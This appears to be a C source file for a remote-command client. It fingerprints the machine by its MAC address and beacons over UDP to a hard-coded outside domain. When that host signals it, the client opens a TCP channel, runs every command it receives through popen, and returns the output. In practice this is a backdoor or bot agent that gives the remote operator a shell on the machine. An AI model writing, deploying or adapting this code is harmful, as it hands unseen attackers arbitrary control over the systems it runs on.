/************************************************************************* 
  > File Name: myClient.c 
  > Author: jiang_yi_bo 
 ************************************************************************/
#include<sys/types.h> 
#include<sys/socket.h> 
#include<unistd.h> 
#include<netinet/in.h> 
#include<arpa/inet.h> 
#include<stdio.h> 
#include<stdlib.h> 
#include<errno.h> 
#include<netdb.h> 
#include<stdarg.h> 
#include<string.h> 
#include <sys/ioctl.h>
#include <net/if.h>


#define DEV_SIZE 20
#define UDP_SERVER_PORT 3478 
#define BUFFER_SIZE 972 
#define FILE_NAME_MAX_SIZE 512 
#define MAXBUF 1000
#define IP_ADDR_INPUT "192.168.1.240"
#define YUMING_IP_ADDR  "cron.iyawen.ren"
//#define YUMING_IP_ADDR  "127.0.0.1"


char localName[20];



/* 包头 */
typedef struct 
{ 
  int id; 
  int buf_size; 
}PackInfo; 
  
/* 接收包 */
typedef struct resP 
{ 
  PackInfo head; 
  char devId[DEV_SIZE];
  char buf[BUFFER_SIZE]; 
} RecvPack; 


RecvPack dataT;  

char cliBuff[1000];  

int   macGet(char*  eth_name,char *mac) 
{ 

    struct   ifreq   ifreq; 
    int   sock; 

    if((sock=socket(AF_INET,SOCK_STREAM,0)) <0) 
    { 
        perror( "socket "); 
        return   2; 
    } 
    strcpy(ifreq.ifr_name,eth_name); 
    if(ioctl(sock,SIOCGIFHWADDR,&ifreq) <0) 
    { 
        perror( "ioctl "); 
        return   3; 
    } 
    sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[0], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[1], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[2], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[3], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[4], 
            (unsigned   char)ifreq.ifr_hwaddr.sa_data[5]); 
    return   0; 
} 


char * exeShell(char *comm){   
    FILE *fstream=NULL;     
 
    int  errnoT = 0;   
	
    memset(cliBuff,0,sizeof(cliBuff));   
   
    if(NULL==(fstream=popen(comm,"r")))     
    {    
        fprintf(stderr,"execute command failed: %s",strerror(errno));     
        return "error";     
    }    
    if(NULL!=fread(cliBuff,1, sizeof(cliBuff), fstream))    
    {    
        printf("exeShell zhi\n");   
    }    
    else   
    {   
        pclose(fstream);   
        return cliBuff;   
    }   
    pclose(fstream);   

	return cliBuff;

}  


int threadTcp()
{
   int ssock;
   int clen;
   struct sockaddr_in server_addr;
   char buf[MAXBUF];
   char cliBuf[MAXBUF];
   RecvPack pack_info; 
   char *p;
   struct hostent *nlp_host;

   char host_name[256];

 
	//初始化主机名和端口。主机名可以是IP，也可以是可被解析的名称
	strcpy(host_name,YUMING_IP_ADDR);

	 
	//解析域名，如果是IP则不用解析，如果出错，显示错误信息
	while ((nlp_host=gethostbyname(host_name))==0){
	    printf("Resolve Error!\n");
	}
	
	  
   if((ssock=socket(PF_INET,SOCK_STREAM,IPPROTO_TCP))<0){
     perror("socket error:");
     return 0;
   }
   clen = sizeof(server_addr);
   memset(&server_addr,0,sizeof(server_addr));
   server_addr.sin_family     =AF_INET;
//   server_addr.sin_addr.s_addr=inet_addr(IP_ADDR_INPUT);
   server_addr.sin_addr.s_addr= ((struct in_addr *)(nlp_host->h_addr))->s_addr;
   server_addr.sin_port       =htons(9527);
   if(connect(ssock,(struct sockaddr *)&server_addr,clen)<0){
      perror("connect error:");
      return -1;
   }

   memset(&pack_info,0,sizeof(pack_info));
    
   pack_info.head.id = 1;
   strcpy(pack_info.devId,localName);
   memcpy(pack_info.buf  ,"jiang"  ,strlen("jiang"));
	
   send(ssock, (char*)&pack_info, sizeof(pack_info),0);

   
   memset(buf,0,MAXBUF);
   if(read(ssock,buf,MAXBUF)<=0)
   {
      perror("read error:");
      exit(1);
   }
   int index;

   while (1){
   	   memset(buf,0,MAXBUF);
	   index = read(ssock,buf,MAXBUF);
	   if(index<=0)
	   {
	      perror("read error:");
	      return ;
	   }

       printf("exec shell 1 %d\n",index);
	  
       p = exeShell(buf);

       send(ssock, (char*)p, 1000,0);
	   printf("exec shell 2 \n");
   }
   
   close(ssock);

   return 0;
}



  
int main() 
{ 
  int id = 1; 
  int ret ;
  pthread_t id1,id2;
  
  /* 服务端地址 */
  struct sockaddr_in server_addr; 

  struct hostent *nlp_host;

  char host_name[256];

  char localmac[20];



  memset(localmac,0,20);

  ret = macGet("eth0",localmac);

   if(ret == 0)
   	{
   	    strcpy(localName,localmac);
		
   	}else{
      
	  strcpy(localName,"jiangyibo");
   	}
 
	//初始化主机名和端口。主机名可以是IP，也可以是可被解析的名称
	strcpy(host_name,YUMING_IP_ADDR);

	 
	//解析域名，如果是IP则不用解析，如果出错，显示错误信息
	while ((nlp_host=gethostbyname(host_name))==0){
	    printf("Resolve Error!\n");
	}


  bzero(&server_addr, sizeof(server_addr)); 
  server_addr.sin_family = AF_INET; 
//  server_addr.sin_addr.s_addr = inet_addr(IP_ADDR_INPUT); 
  server_addr.sin_addr.s_addr =((struct in_addr *)(nlp_host->h_addr))->s_addr;
  server_addr.sin_port = htons(UDP_SERVER_PORT); 
  socklen_t server_addr_length = sizeof(server_addr); 




 
  
  /* 创建socket */
  int client_socket_fd = socket(AF_INET, SOCK_DGRAM, 0); 
  if(client_socket_fd < 0) 
  { 
    perror("Create Socket Failed:"); 
    exit(1); 
  } 

    struct timeval timeout={3,0};//3s
    
    ret=setsockopt(client_socket_fd,SOL_SOCKET,SO_SNDTIMEO,(const char*)&timeout,sizeof(timeout));

	
    ret=setsockopt(client_socket_fd,SOL_SOCKET,SO_RCVTIMEO,(const char*)&timeout,sizeof(timeout));



  
  /* 从服务器接收数据，并写入文件 */

  int len = 0; 
  while(1) 
  { 
      char  pack_info[1000]; 

    
	  
	  bzero(&dataT, sizeof(RecvPack)); 
	  /* 发送文件 */
      dataT.head.id = 1;
	  strcpy(dataT.devId,localName);
	  strcpy(dataT.buf,"jiangyibo");
	  
      printf("jiangyibo send\n");
	  
	  if(sendto(client_socket_fd, &dataT, sizeof(RecvPack),0,(struct sockaddr*)&server_addr,server_addr_length) < 0) 
	  { 
	    perror("Send File Name Failed:"); 
	    exit(1); 
	  } 

	    if((len = recvfrom(client_socket_fd, pack_info, sizeof(pack_info), 0, (struct sockaddr*)&server_addr,&server_addr_length)) > 0) 
	    { 
	        printf("jiangyibo recv %s \n",pack_info);

			
	        if(pack_info[0] == '0')
	        {
	             ret=pthread_create(&id1,NULL,(void *)threadTcp,NULL);//创建线程1
				 if(ret!=0)
				 {
				    printf("create pthread error !\n");

				 }
               
			} else {


			}

     	    sleep(5);
	    } 
	    else
	    { 
	       continue ; 
	    } 
  } 

  close(client_socket_fd); 
  return 0; 
}



